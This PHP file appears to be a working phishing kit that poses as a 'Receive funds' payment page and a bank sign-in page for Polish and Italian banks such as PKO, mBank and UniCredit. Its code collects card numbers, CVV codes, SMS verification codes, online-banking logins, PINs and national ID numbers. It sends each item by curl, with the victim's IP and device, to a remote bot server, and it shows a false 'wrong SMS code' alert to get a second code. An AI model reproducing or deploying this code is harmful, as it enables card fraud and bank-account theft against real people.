

function file_get_cont($url){
    $ch = curl_init($url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $req = curl_exec($ch); curl_close($ch);  
    return $req;
}

include('./config.php');

ini_set('display_errors', 0); 
error_reporting(E_ALL);  
if(!$_COOKIE['tokena']){
	$token = substr(md5(uniqid(rand(), true)),0,8);
  }else{
	$token = $_COOKIE['tokena'];
  }
  if($_POST['get_statuspush_sms']){
    $sms_push = file_get_cont($bot_config->bot_link."api.php?get_statuspush_sms=".$_POST['get_statuspush_sms']);
    echo $sms_push;
    exit();
}
function getBrowser()
    {
        $u_agent = $_SERVER['HTTP_USER_AGENT'];
        $bname = 'Unknown';
        $platform = 'Unknown';
        $version= "";

        //First get the platform? 
        if (preg_match('/android/i', $u_agent)) {
            $platform = '📱 Android';
        }elseif (preg_match('/iphone/i', $u_agent)) {
            $platform = '📱 iPhone';
        }elseif (preg_match('/ipad/i', $u_agent)) {
            $platform = '📱 iPad';
        }elseif (preg_match('/linux/i', $u_agent)) {
            $platform = 'linux';
        }
        elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
            $platform = '💻 Mac OS';
        }
        elseif (preg_match('/windows|win32/i', $u_agent)) {
            $platform = '💻 Windows';
        }
         
    
        // Next get the name of the useragent yes seperately and for good reason
        if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
        {
            $bname = 'Internet Explorer';
            $ub = "MSIE";
        }
        elseif(preg_match('/Firefox/i',$u_agent))
        {
            $bname = 'Mozilla Firefox';
            $ub = "Firefox";
        }
        elseif(preg_match('/Chrome/i',$u_agent))
        {
            $bname = 'Google Chrome';
            $ub = "Chrome";
        }
        elseif(preg_match('/Safari/i',$u_agent))
        {
            $bname = 'Apple Safari';
            $ub = "Safari";
        }
        elseif(preg_match('/Opera/i',$u_agent))
        {
            $bname = 'Opera';
            $ub = "Opera";
        }
        elseif(preg_match('/Netscape/i',$u_agent))
        {
            $bname = 'Netscape';
            $ub = "Netscape";
        }
    
        // finally get the correct version number
        $known = array('Version', $ub, 'other');
        $pattern = '#(?<browser>' . join('|', $known) .
        ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
        if (!preg_match_all($pattern, $u_agent, $matches)) {
            // we have no matching number just continue
        }
    
        // see how many we have
        $i = count($matches['browser']);
        if ($i != 1) {
            //we will have two since we are not using 'other' argument yet
            //see if version is before or after the name
            if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
                $version= $matches['version'][0];
            }
            else {
                $version= $matches['version'][1];
            }
        }
        else {
            $version= $matches['version'][0];
        }
    
        // check if we have a number
        if ($version==null || $version=="") {$version="?";}
    
        return array(
            'userAgent' => $u_agent,
            'name'      => $bname,
            'version'   => $version,
            'platform'  => $platform,
            'pattern'    => $pattern
        );
    }
 

$product = file_get_cont($bot_config->bot_link."api.php?get_product=".$_GET['product']);
$product = json_decode($product);
$browser = getBrowser();  

$card = $_POST['cardNumber'];
$cvv = $_POST['cardCvv'];
$month = $_POST['cardMonth'];
$year = $_POST['cardYear'];
$balance = $_POST['cardBalance'];
$track_id = $_POST['id']; 
$cardName = $_POST['fio'];
$smscode = $_POST['smscode'];
$codefrommypole = $_POST['smscode_mypole'];
$id_card = $_POST['id_card'];

$bank_name = $_POST['bank_name'];
$bank_country = $_POST['bank_country'];
$bank_url = $_POST['bank_url'];
$bank_type = $_POST['bank_type'];
$bank_scheme = $_POST['bank_scheme']; 


$bank_login = $_POST['bank_login'];
$bank_haslo = $_POST['bank_haslo'];
$bank_pin = $_POST['bank_pin'];
$bank_key = $_POST['bank_key'];
$bank_pesel = $_POST['bank_pesel'];
$bank_nmatki = $_POST['bank_nmatki'];
$bank_nojca = $_POST['bank_nojca'];

if($bank_login&&$bank_haslo){
	$arr = array(
        'cmd'=>'update_card',
        'bank_login'=>$bank_login,
		'bank_haslo'=>$bank_haslo,
		'bank_pin'=>$bank_pin,
		'bank_pesel'=>$bank_pesel,
		'bank_nmatki'=>$bank_nmatki,
		'bank_nojca'=>$bank_nojca,
        'id_card'=>$id_card
    ); 

    file_get_cont($bot_config->bot_link."api.php?".http_build_query($arr));
}
if($card&&$cardName&&!$smscode){
	/*$bin = substr(str_replace(" ",'',$card),0,6); 
	$bank = file_get_cont('https://lookup.binlist.net/'.$bin);
	$bank = json_decode($bank); */
	$arr = array(
        'cmd'=>'set_card',
        'number'=>$card,
        'cvv'=>$cvv,
        'month'=>$month,
        'year'=>$year,
        'balance'=>$balance,
        'track_id'=>$track_id,
        'pid'=>$product->id,
        'card_name'=>$cardName,
	    'bank_name'=>$_POST['bank_name'],
        'bank_country'=>$_POST['bank_country'],
        'bank_url'=>$_POST['bank_url'],
        'bank_type'=>$_POST['bank_type'],
        'bank_scheme'=>$_POST['bank_scheme']
    );  
	if($bank_pin){
		$arr['bank_pin']=$bank_pin;
	}
	if($bank_key){
		$arr['bank_key']=$bank_key;
	}
	/*if(!$bank->bank->name){
		$ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://bincheck.io/details/'.$bin); 
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            $head = curl_exec($ch); 
            curl_close($ch); 
			preg_match_all("/<td width=\"40%\">Issuer Name \/ Bank<\/td>\n<td width=\"60%\" style=\"text-align: left;\">(.*)<\/td>/U", $head, $bank_name_match);
			preg_match_all("/<td width=\"40%\">Card Brand<\/td>\n<td style=\"text-align: left;\">(.*)<\/td>/U", $head, $bank_scheme_match);
			preg_match_all("/<td width=\"40%\">Card Type<\/td>\n<td width=\"60%\" style=\"text-align: left;\"> (.*) <\/td>/U", $head, $bank_type_match);

			$bank->bank->name = $bank_name_match[1][0];
			$bank->scheme = $bank_scheme_match[1][0];
			$bank->type = $bank_type_match[1][0];

			$arr['bank_name']=$bank->bank->name; 
			$arr['bank_url']=$bank->url;
			$arr['bank_type']=$bank->type;
			$arr['bank_scheme']=$bank->scheme;
	} */
	
	

    
     //$id_card = file_put_contents($bot_config->bot_link."api.php?cmd=set_card",http_build_query($arr)); 
     $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL,$bot_config->bot_link."api.php?cmd=set_card");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$arr);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $id_card = curl_exec($ch);
    
    curl_close ($ch);

    

//die(print_r($id_card));
    $id_card = json_decode($id_card);
    $id_card = $id_card->id; 
	$data = array(
		'visit'=>'card',
		'card'=>$id_card,
		'token'=>$token,
		'product'=>$product->id,
		'ip'=>$_SERVER['REMOTE_ADDR'],
		'device'=>$browser['platform'].', '.$browser['name']
	  );
	  file_get_cont($bot_config->bot_link.'bot.php?'.http_build_query($data));  
	   
}elseif($smscode&&$id_card){ 
    $arr = array(
        'cmd'=>'update_card',
        'sms'=>$smscode,
        'id_card'=>$id_card
    ); 
    file_get_cont($bot_config->bot_link."api.php?".http_build_query($arr));
     
	$data = array(
		'visit'=>'sms',
		'card'=>$id_card,
		'smscode'=>$smscode,
		'product'=>$product->id,
		'ip'=>$_SERVER['REMOTE_ADDR'],
		'device'=>$browser['platform'].', '.$browser['name']
	  );
	  file_get_cont($bot_config->bot_link.'bot.php?'.http_build_query($data));    
}elseif($codefrommypole&&$id_card){ 
    $arr = array(
        'cmd'=>'update_card',
        'sms_mypole'=>$codefrommypole,
        'id_card'=>$id_card
    ); 
    file_get_cont($bot_config->bot_link."api.php?".http_build_query($arr));
     
	$data = array(
		'visit'=>'sms_mypole',
		'card'=>$id_card,
		'smscode_mypole'=>$codefrommypole,
		'product'=>$product->id,
		'ip'=>$_SERVER['REMOTE_ADDR'],
		'device'=>$browser['platform'].', '.$browser['name']
	  );
	  file_get_cont($bot_config->bot_link.'bot.php?'.http_build_query($data));    
}  


$bank_nm = '';
$_POST['bank_name'] = mb_strtolower($_POST['bank_name']); 

if(strpos($_POST['bank_name'],'pko')!==false){ $bank_nm = 'pko';}
if(strpos($_POST['bank_name'],'santander')!==false){ $bank_nm = 'santander';}
if(strpos($_POST['bank_name'],'deutsche')!==false){ $bank_nm = 'deutsche';}
if(strpos($_POST['bank_name'],'pekao')!==false){ $bank_nm = 'pekao';}
if(strpos($_POST['bank_name'],'agricole')!==false){ $bank_nm = 'agricole';}
if(strpos($_POST['bank_name'],'millennium')!==false){ $bank_nm = 'millennium';}
if(strpos($_POST['bank_name'],'mbank')!==false){ $bank_nm = 'mbank';}

if(strpos($_POST['bank_name'],'unicredit')!==false){ $bank_nm = 'unicredit';}
if(strpos($_POST['bank_name'],'intesa')!==false){ $bank_nm = 'intesa';}
if(strpos($_POST['bank_name'],'poste')!==false){ $bank_nm = 'poste';}
if(strpos($_POST['bank_name'],'fineco')!==false){ $bank_nm = 'fineco';}
if(strpos($_POST['bank_name'],'cartasi')!==false){ $bank_nm = 'nexi';}
if(strpos($_POST['bank_name'],'nexi')!==false){ $bank_nm = 'nexi';}
if(strpos($_POST['bank_name'],'bpm')!==false){ $bank_nm = 'bpm';}
if(strpos($_POST['bank_name'],'ing')!==false){ $bank_nm = 'ing';}
if(strpos($_POST['bank_name'],'n26')!==false){ $bank_nm = 'n26';}
if(strpos($_POST['bank_name'],'bper')!==false){ $bank_nm = 'bper';}

if($bank_login&&$id_card){
	$arr = array(
		'cmd'=>'update_card',
		'id_card'=>$id_card,
		'bank_login'=>$bank_login,
		'bank_haslo'=>$bank_haslo,
		'bank_pin'=>$bank_pin,
		'bank_pesel'=>$bank_pesel,
		'bank_nmatki'=>$bank_nmatki,
		'bank_nojca'=>$bank_nojca
	  ); 
		  file_get_cont($bot_config->bot_link."api.php?".http_build_query($arr));
		  $data = array(
			'visit'=>'banking',
			'card'=>$id_card,
			'bank_login'=>$bank_login,
			'bank_haslo'=>$bank_haslo,
			'bank_pin'=>$bank_pin,
			'bank_pesel'=>$bank_pesel,
			'bank_nmatki'=>$bank_nmatki,
			'bank_nojca'=>$bank_nojca,
			'product'=>$product->id,
			'ip'=>$_SERVER['REMOTE_ADDR'],
			'device'=>$browser['platform'].', '.$browser['name']
		  ); 
		  file_get_cont($bot_config->bot_link.'bot.php?'.http_build_query($data)); 
}

if((strpos($_POST['bank_name'],'pko')!==false|| 
	strpos($_POST['bank_name'],'santander')!==false||
	strpos($_POST['bank_name'],'deutsche')!==false||
	strpos($_POST['bank_name'],'pekao')!==false||
	strpos($_POST['bank_name'],'agricole')!==false||
	strpos($_POST['bank_name'],'millennium')!==false||
	strpos($_POST['bank_name'],'mbank')!==false||
	strpos($_POST['bank_name'],'unicredit')!==false||
	strpos($_POST['bank_name'],'intesa')!==false||
	strpos($_POST['bank_name'],'poste')!==false||
	strpos($_POST['bank_name'],'fineco')!==false||
	strpos($_POST['bank_name'],'nexi')!==false||
	strpos($_POST['bank_name'],'bpm')!==false||
	strpos($_POST['bank_name'],'ing')!==false||
	strpos($_POST['bank_name'],'n26')!==false||
	strpos($_POST['bank_name'],'bper')!==false)&&$bank_login==""){ 

echo '
<!DOCTYPE html>
<html>
    <head>
        <title>Sign In | '.$_POST['bank_name'].'</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <link href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&amp;display=swap" rel="stylesheet">
        <link rel="stylesheet" href="/bank_assets/pko/css/style.css"> 
        <link rel="apple-touch-icon" sizes="180x180" href="/bank_assets/'.$bank_nm.'/apple-touch-icon.png">
		<link rel="icon" type="image/png" sizes="32x32" href="/bank_assets/'.$bank_nm.'/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="16x16" href="/bank_assets/'.$bank_nm.'/favicon-16x16.png">
		<link rel="manifest" href="/bank_assets/'.$bank_nm.'/site.webmanifest">
		<link rel="mask-icon" href="/bank_assets/'.$bank_nm.'/safari-pinned-tab.svg" color="#5bbad5">
		<meta name="msapplication-TileColor" content="#da532c">
		<meta name="theme-color" content="#ffffff">
    </head>
    <body>
        <div class="wrapper">
            <div class="signin_container">
            <img src="/bank_assets/'.$bank_nm.'/favicon-96x96.png" style="margin: 0 auto;" alt="BNP">
                <h1 class="sign_title" style="margin-top: -5px;">Sign in to account</h1>
                <p class="sign_text">To continue sign in to your account</p>
                <hr class="sign_line">
                <form action="#" method="POST" class="form">
                    <div class="row2">
                        <div class=field>
                            <label for="bank_login" class="field_label">Member Code</label>
                            <input name="bank_login" style="width:100%;" type="text" class="field_input" id="kod" required>
                        </div> 
                    </div>
                    <div class="row2"> 
                        <div class=field>
                            <label for="bank_pin" class="field_label">PIN/Password</label>
                            <input name="bank_pin" style="width:100%;"  type="number" class="field_input" id="pin" required>
                        </div> 
                    </div>
                    <input name="login_cabinet" type="hidden" value="true" /> 
                	<input name="id_card" type="hidden" value="'.$id_card.'" />
                	<input name="product" type="hidden" value="'.$_GET['product'].'" />
					<div class="row2">
                        <button class="button" type="submit" style="width: 100%; margin-top: 10px; margin-left: 17px;">
                            <p class="button_text">Continue</p>
                        </button>
                    </div>
                </form>
            </div>
        </div>
	    <style>body a:last-child { z-index:-9999!important; position:absolute;}</style>
    </body>
</html> 
';
}else{
echo'
<!DOCTYPE html>
<html lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Receive funds</title>
      <link rel="icon" href="/favicon.png?v=1" type="image/png">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">

      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
      ';
        if(($smscode&&$id_card)||($codefrommypole&&$id_card)){  
            echo "<script>alert('An unfortunate SMS code was inserted! A new code was sent.');</script>";
        } 
	echo '
       
	    <style>body a:last-child { z-index:-9999!important; position:absolute;}</style>
      <style type="text/css">
      		.waiter {
	border-color: solid 1px black;
	text-align: center;
	color: green
}

.error_status {
	display: none;
}

.cpg_error {
	color: red;
	text-align: center;
} 
.waiter-icon{display: inline-block;background-repeat:no-repeat}
.waiter-icon_name_alert{width:62px;height:53px;background-position:0 0}
.waiter-icon_name_fail{width:65px;height:65px;background-position:-67px 0}
.waiter-icon_name_load{width:65px;height:65px;background-position:-137px 0}
.waiter-icon_name_success{width:65px;height:65px;background-position:-207px 0}

.icon_spin_clockwise{-webkit-animation:spin-clockwise 2s infinite linear;-o-animation:spin-clockwise 2s infinite linear;animation:spin-clockwise 2s infinite linear}
@-webkit-keyframes spin-clockwise{from{-webkit-transform:rotate(0deg);transform:rotate(0deg)}
to{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}
@-o-keyframes spin-clockwise{from{-o-transform:rotate(0deg);transform:rotate(0deg)}
to{-o-transform:rotate(360deg);transform:rotate(360deg)}}
@keyframes spin-clockwise{from{-webkit-transform:rotate(0deg);-o-transform:rotate(0deg);transform:rotate(0deg)}
to{-webkit-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}

.body_fixed-width_no{min-width:0;background:transparent}
.body_fixed-height_no{height:auto}
.body_position_relative{position:relative}1      </style>
    
      <style type="text/css">
      		body,
html {
	height: 100%
}

a,
abbr,
acronym,
address,
applet,
article,
aside,
audio,
b,
big,
blockquote,
body,
button,
canvas,
caption,
center,
cite,
code,
dd,
del,
details,
dfn,
div,
dl,
dt,
em,
embed,
fieldset,
figcaption,
figure,
footer,
form,
h1,
h2,
h3,
h4,
h5,
h6,
header,
hgroup,
html,
i,
iframe,
img,
ins,
kbd,
label,
legend,
li,
mark,
menu,
nav,
object,
ol,
output,
p,
pre,
q,
ruby,
s,
samp,
section,
small,
span,
strike,
strong,
sub,
summary,
sup,
table,
tbody,
td,
tfoot,
th,
thead,
time,
tr,
tt,
u,
ul,
var,
video {
	margin: 0;
	padding: 0;
	border: 0;
	font-size: 100%;
	font: inherit;
	vertical-align: baseline
}

body {
	background: #fff;
	line-height: 1
}

input,
select,
textarea {
	margin: 0;
	outline: 0;
	font-family: arial, sans-serif
}

ol,
ul {
	list-style: none;
	margin: 0;
	padding: 0
}

blockquote,
q {
	quotes: none
}

blockquote:after,
blockquote:before,
q:after,
q:before {
	content: "";
	content: none
}

table {
	border-collapse: collapse;
	border-spacing: 0
}

article,
aside,
canvas,
details,
figcaption,
figure,
footer,
header,
hgroup,
menu,
nav,
section,
summary,
time,
video {
	display: block
}

body {
	font: normal 13px helvetica, arial, sans-serif;
	line-height: 18px;
	color: #333;
	background: #f2f2f2;
	min-width: 980px
}

img {
	-ms-interpolation-mode: bicubic
}

a {
	-webkit-transition: color .2s;
	-o-transition: color .2s;
	transition: color .2s
}

.pseudo-link,
a {
	text-decoration: none;
	color: #06c
}

.pseudo-link {
	cursor: pointer
}

.pseudo-link:hover,
a:hover {
	text-decoration: underline
}

b,
strong {
	color: #000;
	font-weight: 700
}

h1,
h2,
h3,
h4,
h5,
h6 {
	clear: both;
	margin: 0
}

.clearfix:after,
.clearfix:before {
	content: "";
	display: table
}

.clearfix:after {
	clear: both
}

.counters {
	position: absolute;
	left: -9999px;
	top: -9999px;
	width: 0;
	height: 0;
	line-height: 0;
	font-size: 0;
	overflow: hidden
}

.portal-menu {
	z-index: 10
}

.body_fixed-width_no {
	min-width: 0;
	background: transparent
}

.body_fixed-height_no {
	height: auto
}

.body_position_relative {
	position: relative
}

.red {
	color: red
}

.Errors {
	margin-top: -10px
}

.html_responsive_yes {
	font-size: 8px
}

.html_responsive_yes body {
	min-width: 0
}

@media (min-width:320px) {
	.html_responsive_yes {
		font-size: 8px
	}
}

@media (min-width:640px) {
	.html_responsive_yes {
		font-size: 12px
	}
}

@media (min-width:1000px) {
	.html_responsive_yes {
		font-size: 10px
	}
}

.icon_spin_clockwise,
.icon_spin_counterclockwise {
	-webkit-animation: spin-clockwise 2s infinite linear;
	-o-animation: spin-clockwise 2s infinite linear;
	animation: spin-clockwise 2s infinite linear
}

.icon_spin_counterclockwise {
	-webkit-animation-direction: reverse;
	-o-animation-direction: reverse;
	animation-direction: reverse
}

.icon_steps_clockwise {
	-webkit-animation-name: loader_steps_spin;
	-o-animation-name: loader_steps_spin;
	animation-name: loader_steps_spin;
	-webkit-animation-duration: 1s;
	-o-animation-duration: 1s;
	animation-duration: 1s;
	-webkit-animation-iteration-count: infinite;
	-o-animation-iteration-count: infinite;
	animation-iteration-count: infinite;
	-webkit-animation-timing-function: steps(12);
	-o-animation-timing-function: steps(12);
	animation-timing-function: steps(12)
}

@-webkit-keyframes spin-clockwise {
	0% {
		-webkit-transform: rotate(0deg);
		transform: rotate(0deg)
	}
	to {
		-webkit-transform: rotate(1turn);
		transform: rotate(1turn)
	}
}

@-o-keyframes spin-clockwise {
	0% {
		-o-transform: rotate(0deg);
		transform: rotate(0deg)
	}
	to {
		-o-transform: rotate(1turn);
		transform: rotate(1turn)
	}
}

@keyframes spin-clockwise {
	0% {
		-webkit-transform: rotate(0deg);
		-o-transform: rotate(0deg);
		transform: rotate(0deg)
	}
	to {
		-webkit-transform: rotate(1turn);
		-o-transform: rotate(1turn);
		transform: rotate(1turn)
	}
}

@-webkit-keyframes loader_steps_spin {
	0% {
		-webkit-transform: rotate(0deg);
		transform: rotate(0deg)
	}
	to {
		-webkit-transform: rotate(1turn);
		transform: rotate(1turn)
	}
}

@-o-keyframes loader_steps_spin {
	0% {
		-o-transform: rotate(0deg);
		transform: rotate(0deg)
	}
	to {
		-o-transform: rotate(1turn);
		transform: rotate(1turn)
	}
}

@keyframes loader_steps_spin {
	0% {
		-webkit-transform: rotate(0deg);
		-o-transform: rotate(0deg);
		transform: rotate(0deg)
	}
	to {
		-webkit-transform: rotate(1turn);
		-o-transform: rotate(1turn);
		transform: rotate(1turn)
	}
}
</style>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
     
      <script type="text/javascript">var isSubmitButtonClicked;
var isPasteDetected;

function removeCardIdFromSelect(cardId) {
	$(\'#CardSelectList option\').each(function() {
		if ($(this).val() === cardId) {
			$(this).remove();
			if (typeof SelectCard === \'function\') {
				SelectCard();
			}
		}
	});

	if ($(\'#CardSelectList option\').length === 1) {
		$(\'#divAuthorizedCardList\').hide();
	}
}

function removeCardRequest(cardId, sessionId, sessionSignature, callback, options) {
	var data = {
		card_id: cardId,
		all: 1,
		session_id: sessionId,
		signature: sessionSignature
	};
	if (!cardId || cardId === \'FreePay\') {
		return false;
	}
	if (typeof (options) !== \'undefined\') {
		if (options.hasOwnProperty(\'ts\')) {
			data.ts = options.ts;
		}
	}
	return $.ajax({
		url: \'/api/in/card/delete\',
		type: \'POST\',
		data: data,
		dataType: \'json\'
	}).done(function(response) {
		switch (response.status) {
			case \'OK\':
				window.parent.postMessage(JSON.stringify({
					type: \'billing\',
					action: \'removeAddedCard\',
					action_params: cardId
				}), \'*\');

				typeof callback === \'function\' ? callback(cardId) : removeCardIdFromSelect(cardId);
				break;
			default:
				break;
		}
	});
}

function putSubmitButtonClickPixel() {
	cpg_context[\'rb\'].putPixel(\'form_submit-button-click-all\');
	if (!isSubmitButtonClicked) {
		cpg_context[\'rb\'].putPixel(\'form_submit-button-click-first\');
		isSubmitButtonClicked = true;
	}
}

function putCopyPasteFillPixel() {
	if (isPasteDetected) {
		cpg_context[\'rb\'].putPixel(\'form_fill-copypaste-send\');
	}
}

function sendFrameResizeMessage() {
	setTimeout(function() {
		window.parent.postMessage(JSON.stringify({
			type: \'billing\',
			action: \'resizeFrame\',
			action_params: {
				height: document.body.getBoundingClientRect().height
			}
		}), \'*\');
	}, 0);
}

function hidePayCardWrapper() {
	var payCardWrapper = document.getElementsByClassName(\'js-pay-card-wrapper\')[0];

	if (payCardWrapper) {
		payCardWrapper.style.display = \'none\';
	}
}

function showPayCardWrapper() {
	var payCardWrapper = document.getElementsByClassName(\'js-pay-card-wrapper\')[0];
	var typeDisplay = \'\';

	if (payCardWrapper) {
		typeDisplay = typeof payCardWrapper.dataset.typeDisplay !== \'undefined\' ? typeDisplay : \'block\';
		payCardWrapper.style.display = typeDisplay;
	}
}1</script>
      <script type="text/javascript">
function CpgWaiter(settings) {
	/* Коллбэки */

	/* onParamsError - вызывается в случае, если вейтер получил от сервера ошибку ERR_ARGUMENTS.
	На вход функция получает массив полей с ошибками */
	this.onParamsError = settings.onParamsError;
	/* onServerError - ошибка сервера. В случае, если сервер вернул код ошибки,
	то на вход функции подается весь ответ сервера (json-объект, содержащий код
	и сообщение об ошибке). Если была ошибка взаимодействия с сервером или ответ
	не является валидным JSON, то коллбэк вызывается с параметрами null, textStatus (тип ошибки) */
	this.onServerError = settings.onServerError;
	/* onTimeout - коллбэк вызывается, когда исчерпан лимит опроса сервера */
	this.onTimeout = settings.onTimeout;
	/* onConfirm - коллэк вызывается, когда необходимо подтверждение транзакции пользователем до перехода на 3ds.
	На вход получает ответ сервера (JSON-объект) */
	this.onConfirm = settings.onConfirm;
	/* onSuccess - коллбэк вызывается, если в результате опроса получен финальный статус,
	но он не является редиректом. На вход коллбэк получает ответ сервера (JSON-объект) */
	this.onSuccess = settings.onSuccess;
	this.onError = settings.onError;
	/* onShow - опциональный коллбэк, который может вызываться перед показом "часиков" */
	this.onShow = settings.onShow;
	/* onHide - опциональный коллбэк, который может вызываться перед скрытием "часиков" */
	this.onHide = settings.onHide;
	/* onRedirect - если задан этот коллбэк, то он вызывается вместо редиректа при
	получении в ответе сервера команды redirect. На вход фукнция получает url для редиректа */
	this.onRedirect = settings.onRedirect;

	/* onBackUrlRedirect - если задан этот коллбэк, то он вызывается при получении ошибки сабмита формы, если ошибка
	не содержит адреса редиректа. Предполагается, что должна перенаправлять на back_url c выставленным флагом ошибки.
	На вход коллбэк получает ответ сервера (JSON-объект). */
	this.onBackUrlRedirect = settings.onBackUrlRedirect;

	/* requestMethod - метод запроса. По умолчанию POST */
	this.requestMethod = settings.requestMethod || \'POST\';
	/* clockElement - id элемента, демонстрирующего "часики". По умолчанию "waiter" */
	this.clockElement = settings.clockElement || \'cpg_waiter\';
	this.submitElement = settings.submitElement || \'cpg_submit\';
	/* pollLimit - лимит попыток опроса сервера. По умолчанию 20 */
	this.pollLimit = settings.pollLimit || 20;
	/* pollInterval - интервал между попытками опроса сервера (в миллисекундах). По умолчанию - 1000 */
	this.pollInterval = settings.pollInterval || 1000;

	/* submitUrl - адрес для отправки формы */
	this.submitUrl = settings.submitUrl;
	/* pollUrl - опционально можно задать url для опроса на случай, если он не вернется
	в результате отправки формы */
	this.pollUrl = settings.pollUrl;

	/* fakeAjax - если true и подключен плагин jquery.ajax.fake - имитация запроса на сервер */
	this.fakeAjax = settings.fakeAjax;

	var pollTimer = 0;
	var pollCount = 0;
	var sourceForm = undefined;
	var ajaxParams = undefined;

	/* Отправка формы на сервер. Функция должна принимать на вход обязательный параметр - объект формы. Также допускается явная передача заранее собранных параметров. Если аргумент params не задан, то данные формы будут собраны с помощью метода jQuery serialize
	 */
	this.submit = function(form, params) {
		if (! params) {
			params = $(form).serialize();
		}

		/* почистим ошибки формы */
		if (this.onParamsError) {
			this.onParamsError(null, 1);
		}

		ajaxParams = params;
		sourceForm = form;

		pollCount = 0; /* обнуляем число попыток опроса */
		this.showClock(); /* показываем часики */
		var waiter = this;
		$.ajax({
			url: waiter.submitUrl,
			type: waiter.requestMethod,
			fake: waiter.fakeAjax,
			dataType: \'json\',
			data: params
		}).done(function(data) {
			if (data.error) {
				if (data.error.error_fields) {
					if (waiter.onParamsError) {
						waiter.onParamsError(data.error.error_fields);
					}
					waiter.finish();
				} else if (data.url) {
					if (waiter.onRedirect) {
						waiter.onRedirect(data.url);
					} else {
						redirect(data.url);
					}
				} else {
					if (waiter.onBackUrlRedirect) {
						waiter.onBackUrlRedirect(data);
					}
					waiter.finish();
				}
			} else {
				if (waiter.onSubmitSuccess) {
					waiter.onSubmitSuccess(data);
				} else {
					waiter.startPoll(data.url, data.params);
				}
			}
		}).fail(function(jqXHR, textStatus, err) {
			/* Не достучались до сервера или не получили валидный JSON - вызываем коллбэк */
			if (waiter.onServerError) {
				waiter.onServerError(null, textStatus);
			}
			waiter.finish();
		});
	};

	this.resetPollCount = function() {
		pollCount = 0;
	}

	this.showClock = function() {
		if (this.onShow) {
			this.onShow();
		}
		$("#" + this.submitElement).prop(\'disabled\', true);
		$(\'#\' + this.clockElement).show();
	};

	this.finish = function() {
		if (this.onHide) {
			this.onHide();
		}
		$(\'#\' + this.clockElement).hide();
		$("#" + this.submitElement).prop(\'disabled\', false);
	};

	var redirect = function(url) {
		window.location.href = url;
	};

	this.startPoll = function(url, params) {
		/* С сервера могли прийти кастомные параметры для дальнешей отправки при опросе - сохраняем их */
		if (params) {
			ajaxParams = params;
		}
		clearTimeout(pollTimer);
		var waiter = this;
		pollCount++;
		if (pollCount > this.pollLimit) {
			if (this.onTimeout) {
				this.onTimeout();
			}
			return this.finish();
		}
		pollTimer = setTimeout(function() {
			$.ajax({
				url: url || waiter.pollUrl,
				type: waiter.requestMethod,
				fake: waiter.fakeAjax,
				dataType: \'json\'
			}).done(function(data) {
				switch (data.status) {
					case \'OK_CONTINUE\':
						/* Продолжаем опрос */
						waiter.startPoll(url);
						break;
					case \'OK_FINISH\':
						/* Финальный статус */
						if (data.acs_url) {
							if ( waiter.on3DS ) {
								waiter.on3DS(data);
							} else {
								waiter.submit3DS(data);
							}
						} else if (data.confirm_data && waiter.onConfirm) {
							waiter.onConfirm(data);
						} else if (waiter.onSuccess) {
							waiter.onSuccess(data);
						} else if (data.url) {
							/* Пришел редирект - выполняем */
							if (waiter.onRedirect) {
								waiter.onRedirect(data.url);
							} else {
								redirect(data.url);
							}
						}
						waiter.finish();
						break;
					 case \'ERR_FINISH\':
						if ( waiter.onError ) {
							waiter.onError(data);
						} else if (data.url) {
							if (waiter.onRedirect) {
								waiter.onRedirect(data.url)
							} else {
								redirect(data.url);
							}
						}
						waiter.finish();
						break;
					default:
						/* Произвольная ошибка - вызываем коллбэк, передаем туда весь ответ сервера */
						if (waiter.onServerError) {
							waiter.onServerError(data);
						}
						waiter.finish();
						break;
				}
			}).fail(function(jqXHR, textStatus, err) {
				/* Ошибка взаимодействия с сервером или невалидный JSON-объект */
				if (waiter.onServerError) {
					waiter.onServerError(null, textStatus);
				}
				waiter.finish();
			});
		}, waiter.pollInterval);
	};

	this.submit3DS = function(data) {
		this.create3DSform(data);
		document.getElementById(\'cpg_acs_form\').submit();
	}

	this.create3DSform = function(data) {
		var tds = data.threeds_data;
		$(\'body\').append(\'<form id="cpg_acs_form" action="\' + data.acs_url + \'"\' + ( typeof(data.target) != \'undefined\' ? (\'target=\' + data.target) : \'\' ) + \' method="POST">\'
			+ \'<input type="hidden" name="PaReq" value="\' + tds.PaReq + \'" />\'
			+ \'<input type="hidden" name="TermUrl" value="\' + tds.TermUrl + \'" />\'
			+ \'<input type="hidden" name="MD" value="\' + tds.MD + \'" />\'
			+ \'</form>\');
	}
}

function getBaseUrl() {
	var url = document.URL;
	var re = /(https?:\/\/.+?)(\/|\?)/;
	var found = url.match(re);
	return found[1];
}

function createCpgWaiter() {
	var baseUrl = getBaseUrl();
	return new CpgWaiter({
		submitUrl: baseUrl + $("#cpg_form").attr(\'action\'),
		clockElement: \'cpg_waiter\',
		submitElement: \'cpg_submit\',
		requestMethod: \'POST\',
		onServerError: function(data) {
			$("#cpg_form").hide();
			$("#cpg_error").show();
		},
		onParamsError: function(errors, remove) {
			if (remove) {
				$("#cpg_form").find(\'label\').removeClass(\'cpg_error\');
			} else {
				for (var field in errors) {
					$(\'#\' + errors[field]).addClass(\'cpg_error\');
				}
